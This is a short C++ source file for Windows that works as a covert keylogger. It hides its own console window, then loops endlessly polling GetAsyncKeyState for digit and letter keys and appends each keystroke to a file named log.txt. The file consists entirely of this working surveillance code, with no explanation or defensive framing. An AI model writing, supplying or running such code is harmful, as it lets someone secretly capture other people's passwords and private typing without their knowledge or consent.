#include <windows.h>
#include <fstream>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::ofstream log;
	while (true)
	{
		for (int i = 48; i <= 90; i++)
		{
			if ((i <= 57 || i >= 65) && (GetAsyncKeyState(i) == -32767))
			{

				log.open("log.txt", std::ofstream::app);
				log << char(i) << "\n";
				log.close();
			}
		}
	}
	return 0;
}    
